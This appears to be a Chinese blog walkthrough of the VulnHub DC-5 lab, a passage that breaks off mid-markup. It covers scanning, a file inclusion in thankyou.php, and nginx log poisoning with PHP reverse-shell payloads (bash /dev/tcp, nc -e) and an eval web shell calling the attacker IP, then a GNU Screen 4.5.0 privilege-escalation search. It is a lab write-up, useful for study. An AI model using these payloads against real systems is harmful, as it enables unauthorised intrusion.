@@ -1,0 +1,578 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+  <title>DC：5 - Knight&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Knight's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/post.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="DC：5">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-07-11 00:00" pubdate>
+        2022年7月11日 凌晨
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      4.3k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      77
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">DC：5</h1>
+            
+            <div class="markdown-body">
+              <h1 id="0x08-DC-5-vulnhub"><a href="#0x08-DC-5-vulnhub" class="headerlink" title="0x08 DC: 5~vulnhub"></a>0x08 DC: 5~vulnhub</h1><blockquote>
+<p>靶机地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-5,314/">DC: 5 ~ VulnHub</a></p>
+<p>环境信息：</p>
+<ul>
+<li>攻击机 IP：192.168.135.141</li>
+<li>靶机 IP：192.168.135.160</li>
+</ul>
+</blockquote>
+<h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><h3 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h3><p><strong>nmap 命令：</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -sn 192.168.135.0/24</span><br></code></pre></td></tr></table></figure>
+<p><strong>得到靶机 ip：192.168.135.160</strong></p>
+<h3 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h3><p><strong>nmap 命令：</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo nmap -sS -A -p- 192.168.135.160</span><br>[sudo] password for kali: <br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-07-11 01:01 EDT<br>Nmap scan report for 192.168.135.160<br>Host is up (0.00059s latency).<br>Not shown: 65532 closed ports<br>PORT      STATE SERVICE VERSION<br>80/tcp    open  http    nginx 1.6.2<br>|_http-server-header: nginx/1.6.2<br>|_http-title: Welcome<br>111/tcp   open  rpcbind 2-4 (RPC #100000)<br>| rpcinfo: <br>|   program version    port/proto  service<br>|   100000  2,3,4        111/tcp   rpcbind<br>|   100000  2,3,4        111/udp   rpcbind<br>|   100000  3,4          111/tcp6  rpcbind<br>|   100000  3,4          111/udp6  rpcbind<br>|   100024  1          36336/tcp   status<br>|   100024  1          52090/udp6  status<br>|   100024  1          56452/tcp6  status<br>|_  100024  1          60965/udp   status<br>36336/tcp open  status  1 (RPC #100024)<br>MAC Address: 00:0C:29:01:AF:12 (VMware)<br>Device type: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br></code></pre></td></tr></table></figure>
+<p><strong>得到目标端口信息：</strong></p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>PORT</th>
+<th>STATE</th>
+<th>SERVICE</th>
+<th>VERSION</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>80/tcp</td>
+<td>open</td>
+<td>ssh</td>
+<td>nginx 1.6.2</td>
+</tr>
+<tr>
+<td>111/tcp</td>
+<td>open</td>
+<td>rpcbind</td>
+<td>2-4 (RPC #100000)</td>
+</tr>
+<tr>
+<td>36336/tcp</td>
+<td>open</td>
+<td>status</td>
+<td>1 (RPC #100024)</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h3 id="3、端口探测"><a href="#3、端口探测" class="headerlink" title="3、端口探测"></a>3、端口探测</h3><p><strong>80端口</strong></p>
+<p>进行目录爆破，得到 robots.txt：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> dirb http://192.168.135.160</span><br><span class="hljs-meta">$</span><span class="bash"> gobuster dir -u http://192.168.135.160  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="hljs-meta">$</span><span class="bash"> nikto -h 192.168.135.160</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> dirsearch -u http://192.168.135.160</span><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br>Output File: /home/kali/.dirsearch/reports/192.168.135.160/_22-07-11_01-13-17.txt<br>Error Log: /home/kali/.dirsearch/logs/errors-22-07-11_01-13-17.log<br>Target: http://192.168.135.160/<br><br>[01:13:17] Starting: <br>[01:13:34] 200 -    4KB - /contact.php                                      <br>[01:13:35] 301 -  184B  - /css  -&gt;  http://192.168.135.160/css/             <br>[01:13:37] 200 -    6KB - /faq.php                                          <br>[01:13:38] 200 -   17B  - /footer.php                                       <br>[01:13:39] 301 -  184B  - /images  -&gt;  http://192.168.135.160/images/       <br>[01:13:39] 403 -  570B  - /images/<br>[01:13:39] 200 -    4KB - /index.php                                        <br>[01:13:53] 200 -  852B  - /thankyou.php                                     <br>                                                                             <br>Task Completed                                 <br></code></pre></td></tr></table></figure>
+<p>题目给的提示：</p>
+<blockquote>
+<p>As far as I am aware, there is only one exploitable entry point to get in (there is no SSH either). This particular entry point may be quite hard to identify, but it is there. You need to look for something a little out of the ordinary (something that changes with a refresh of a page). This will hopefully provide some kind of idea as to what the vulnerability might involve.</p>
+</blockquote>
+<p>访问 <code>http://192.168.135.160/footer.php</code> ，刷新发现年份一直在变</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">Copyright © 2017 ===&gt; Copyright © 2018 ===&gt; Copyright © 2019 ===&gt; Copyright © 2020<br></code></pre></td></tr></table></figure>
+<p>访问 <code>http://192.168.135.160/thankyou.php</code> ，刷新发现年份也会变，但是其他页面刷新是不会变的，说明 <code>thankyou.php</code> 文件可能包含了 <code>footer.php</code> 文件，意味着 <code>thankyou.php</code> 文件可能存在文件包含漏洞 。</p>
+<p>访问 <code>http://192.168.135.160/thankyou.php?file=/etc/passwd</code> ，得到：</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-symbol">root:</span><span class="hljs-symbol">x:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:root</span><span class="hljs-symbol">:/root</span><span class="hljs-symbol">:/bin/bash</span> <span class="hljs-symbol">daemon:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span><span class="hljs-symbol">:daemon</span><span class="hljs-symbol">:/usr/sbin</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">bin:</span><span class="hljs-symbol">x:</span><span class="hljs-number">2</span><span class="hljs-symbol">:</span><span class="hljs-number">2</span><span class="hljs-symbol">:bin</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">sys:</span><span class="hljs-symbol">x:</span><span class="hljs-number">3</span><span class="hljs-symbol">:</span><span class="hljs-number">3</span><span class="hljs-symbol">:sys</span><span class="hljs-symbol">:/dev</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">sync:</span><span class="hljs-symbol">x:</span><span class="hljs-number">4</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:sync</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/bin/sync</span> <span class="hljs-symbol">games:</span><span class="hljs-symbol">x:</span><span class="hljs-number">5</span><span class="hljs-symbol">:</span><span class="hljs-number">60</span><span class="hljs-symbol">:games</span><span class="hljs-symbol">:/usr/games</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">man:</span><span class="hljs-symbol">x:</span><span class="hljs-number">6</span><span class="hljs-symbol">:</span><span class="hljs-number">12</span><span class="hljs-symbol">:man</span><span class="hljs-symbol">:/var/cache/man</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">lp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">7</span><span class="hljs-symbol">:</span><span class="hljs-number">7</span><span class="hljs-symbol">:lp</span><span class="hljs-symbol">:/var/spool/lpd</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">mail:</span><span class="hljs-symbol">x:</span><span class="hljs-number">8</span><span class="hljs-symbol">:</span><span class="hljs-number">8</span><span class="hljs-symbol">:mail</span><span class="hljs-symbol">:/var/mail</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">news:</span><span class="hljs-symbol">x:</span><span class="hljs-number">9</span><span class="hljs-symbol">:</span><span class="hljs-number">9</span><span class="hljs-symbol">:news</span><span class="hljs-symbol">:/var/spool/news</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">uucp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">10</span><span class="hljs-symbol">:</span><span class="hljs-number">10</span><span class="hljs-symbol">:uucp</span><span class="hljs-symbol">:/var/spool/uucp</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">proxy:</span><span class="hljs-symbol">x:</span><span class="hljs-number">13</span><span class="hljs-symbol">:</span><span class="hljs-number">13</span><span class="hljs-symbol">:proxy</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/sbin/nologin</span> www-<span class="hljs-symbol">data:</span><span class="hljs-symbol">x:</span><span class="hljs-number">33</span><span class="hljs-symbol">:</span><span class="hljs-number">33</span><span class="hljs-symbol">:www-data</span><span class="hljs-symbol">:/var/www</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">backup:</span><span class="hljs-symbol">x:</span><span class="hljs-number">34</span><span class="hljs-symbol">:</span><span class="hljs-number">34</span><span class="hljs-symbol">:backup</span><span class="hljs-symbol">:/var/backups</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">list:</span><span class="hljs-symbol">x:</span><span class="hljs-number">38</span><span class="hljs-symbol">:</span><span class="hljs-number">38</span><span class="hljs-symbol">:Mailing</span> List <span class="hljs-symbol">Manager:</span>/var/<span class="hljs-symbol">list:</span>/usr/sbin/nologin <span class="hljs-symbol">irc:</span><span class="hljs-symbol">x:</span><span class="hljs-number">39</span><span class="hljs-symbol">:</span><span class="hljs-number">39</span><span class="hljs-symbol">:ircd</span><span class="hljs-symbol">:/var/run/ircd</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">gnats:</span><span class="hljs-symbol">x:</span><span class="hljs-number">41</span><span class="hljs-symbol">:</span><span class="hljs-number">41</span><span class="hljs-symbol">:Gnats</span> Bug-Reporting System (admin)<span class="hljs-symbol">:/var/lib/gnats</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">nobody:</span><span class="hljs-symbol">x:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:nobody</span><span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/usr/sbin/nologin</span> systemd-<span class="hljs-symbol">timesync:</span><span class="hljs-symbol">x:</span><span class="hljs-number">100</span><span class="hljs-symbol">:</span><span class="hljs-number">103</span><span class="hljs-symbol">:systemd</span> Time Synchronization,,,<span class="hljs-symbol">:/run/systemd</span><span class="hljs-symbol">:/bin/false</span> systemd-<span class="hljs-symbol">network:</span><span class="hljs-symbol">x:</span><span class="hljs-number">101</span><span class="hljs-symbol">:</span><span class="hljs-number">104</span><span class="hljs-symbol">:systemd</span> Network Management,,,<span class="hljs-symbol">:/run/systemd/netif</span><span class="hljs-symbol">:/bin/false</span> systemd-<span class="hljs-symbol">resolve:</span><span class="hljs-symbol">x:</span><span class="hljs-number">102</span><span class="hljs-symbol">:</span><span class="hljs-number">105</span><span class="hljs-symbol">:systemd</span> Resolver,,,<span class="hljs-symbol">:/run/systemd/resolve</span><span class="hljs-symbol">:/bin/false</span> systemd-bus-<span class="hljs-symbol">proxy:</span><span class="hljs-symbol">x:</span><span class="hljs-number">103</span><span class="hljs-symbol">:</span><span class="hljs-number">106</span><span class="hljs-symbol">:systemd</span> Bus Proxy,,,<span class="hljs-symbol">:/run/systemd</span><span class="hljs-symbol">:/bin/false</span> Debian-<span class="hljs-symbol">exim:</span><span class="hljs-symbol">x:</span><span class="hljs-number">104</span><span class="hljs-symbol">:</span><span class="hljs-number">109</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/spool/exim4</span><span class="hljs-symbol">:/bin/false</span> <span class="hljs-symbol">messagebus:</span><span class="hljs-symbol">x:</span><span class="hljs-number">105</span><span class="hljs-symbol">:</span><span class="hljs-number">110</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/run/dbus</span><span class="hljs-symbol">:/bin/false</span> <span class="hljs-symbol">statd:</span><span class="hljs-symbol">x:</span><span class="hljs-number">106</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/lib/nfs</span><span class="hljs-symbol">:/bin/false</span> <span class="hljs-symbol">sshd:</span><span class="hljs-symbol">x:</span><span class="hljs-number">107</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/run/sshd</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">dc:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:dc</span>,,,<span class="hljs-symbol">:/home/dc</span><span class="hljs-symbol">:/bin/bash</span> <span class="hljs-symbol">mysql:</span><span class="hljs-symbol">x:</span><span class="hljs-number">108</span><span class="hljs-symbol">:</span><span class="hljs-number">113</span><span class="hljs-symbol">:MySQL</span> Server,,,<span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/bin/false</span><br></code></pre></td></tr></table></figure>
+<p>的确存在文件包含，很明显是文件包含漏洞，但想了好久都没有想到该怎么用这个漏洞，网上发现有人是通过日志文件得  shell 的 。</p>
+<h2 id="二、权限获取"><a href="#二、权限获取" class="headerlink" title="二、权限获取"></a>二、权限获取</h2><p>通过日志文件得 shell 的方法，主要原理是：通过发起带有一句话木马或者反弹 shell 的请求，将一句话木马或者反弹 shell 写入日志文件，再通过包含日志文件从而达到执行一句话木马或者反弹 shell 的目的 。</p>
+<p>访问日志主要记录客户端的请求。客户端向 Nginx 服务器发起的每一次请求都记录在这里。客户端 IP，浏览器信息，referer，请求处理时间，请求 URL 等都可以在访问日志中得到 。</p>
+<p>Nginx 服务器访问日志文件默认目录是：<code>/var/log/nginx/access.log</code></p>
+<p>访问 <code>http://192.168.135.160/thankyou.php?file=/var/log/nginx/access.log</code> ，可以看到我们的访问记录：</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">192.168.135.141</span> - - <span class="hljs-string">[11/Jul/2022:23:01:29 +1000]</span> <span class="hljs-string">&quot;<span class="hljs-keyword">GET</span> / HTTP/1.0&quot;</span> <span class="hljs-number">200</span> <span class="hljs-number">4025</span> <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">135</span>.<span class="hljs-number">141</span> - - <span class="hljs-string">[11/Jul/2022:23:01:36 +1000]</span> <span class="hljs-string">&quot;<span class="hljs-keyword">OPTIONS</span> / HTTP/1.1&quot;</span> <span class="hljs-number">405</span> <span class="hljs-number">172</span> <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)&quot;</span> <br></code></pre></td></tr></table></figure>
+<p>使用 curl 发送请求：</p>
+<blockquote>
+<p>经尝试发现，bash 不可以反弹，nc 可以反弹</p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> curl -A <span class="hljs-string">&quot;&lt;?php system(&#x27;bash -i &gt;&amp; /dev/tcp/192.168.135.141/4444 0&gt;&amp;1&#x27;) ?&gt;&quot;</span> http://192.168.135.160/thankyou.php</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> curl -A <span class="hljs-string">&quot;&lt;?php system(&#x27;nc -e /bin/sh 192.168.135.141 4444&#x27;) ?&gt;&quot;</span> http://192.168.135.160/thankyou.php</span><br></code></pre></td></tr></table></figure>
+<p>或者使用 <code>Burp</code>  在 <code>access.log</code> 里面传入一句话木马，然后上菜刀进行连接：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">GET /hello-world! &lt;?php @eval($_REQUEST[cmd])?&gt; HTTP/<span class="hljs-number">1.1</span><br></code></pre></td></tr></table></figure>
+<p>kali 监听，浏览器访问 <code>http://192.168.135.160/thankyou.php?file=/var/log/nginx/access.log</code> ，成功得到 shell：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc -lnvp 4444</span>            <br>listening on [any] 4444 ...<br>connect to [192.168.135.141] from (UNKNOWN) [192.168.135.160] 53731<br>whoami<br>www-data<br>python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;<br>www-data@dc-5:~/html$ pwd<br>pwd<br>/var/www/html<br>www-data@dc-5:~/html$ <br></code></pre></td></tr></table></figure>
+<h2 id="三、权限提升"><a href="#三、权限提升" class="headerlink" title="三、权限提升"></a>三、权限提升</h2><p>查找 SUID：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null</span>    <br>/bin/su<br>/bin/mount<br>/bin/umount<br>/bin/screen-4.5.0<br>/usr/bin/gpasswd<br>/usr/bin/procmail<br>/usr/bin/at<br>/usr/bin/passwd<br>/usr/bin/chfn<br>/usr/bin/newgrp<br>/usr/bin/chsh<br>/usr/lib/openssh/ssh-keysign<br>/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>/usr/lib/eject/dmcrypt-get-device<br>/usr/sbin/exim4<br>/sbin/mount.nfs<br></code></pre></td></tr></table></figure>
+<p>看到了 <code>/bin/screen-4.5.0</code> </p>
+<blockquote>
+<p>GNU Screen是一款由GNU计划开发的用于命令行终端切换的自由软件。用户可以通过该软件同时连接多个本地或远程的命令行会话，并在其间自由切换。Screen可以看作是窗口管理器的命令行界面版本。它提供了统一的管理多个会话的界面和相应的功能。</p>
+</blockquote>
+<p>查找利用脚本：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> searchsploit screen 4.5.0</span><br>----------------------------------------------------------------------- ---------------------------------<br> Exploit Title                                                         |  Path<br>----------------------------------------------------------------------- ---------------------------------<br>GNU Screen 4.5.0 - Local Privilege Escalation                          | linux/local/41154.sh<br>GNU Screen 4.5.0 - Local Privilege Escalation (PoC)                    | linux/local/41152.txt<br>----------------------------------------------------------------------- ---------------------------------<br>Shellcodes: No Results<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> searchsploit -m 41154.sh</span><br>  Exploit: GNU Screen 4.5.0 - Local Privilege Escalation<br>      URL: https://www.exploit-db.com/exploits/41154<br>     Path: /usr/share/exploitdb/exploits/linux/local/41154.sh<br>File Type: Bourne-Again shell script, ASCII text executable, with CRLF line terminators<br><br>Copied to: /home/kali/41154.sh<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> cat 41154.sh</span><br></code></pre></td></tr></table></figure>
+<p>这里使用第一个，查看脚本，发现需要使用 gcc ，查看靶机有没有 gcc：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@dc-5:~/html$ gcc --version<br>gcc --version<br>gcc (Debian 4.9.2-10+deb8u2) 4.9.2<br>Copyright (C) 2014 Free Software Foundation, Inc.<br>This is free software; see the source for copying conditions.  There is NO<br>warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.<br></code></pre></td></tr></table></figure>
+<p>上传至靶机 /tmp 目录，加可执行权限，运行：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span 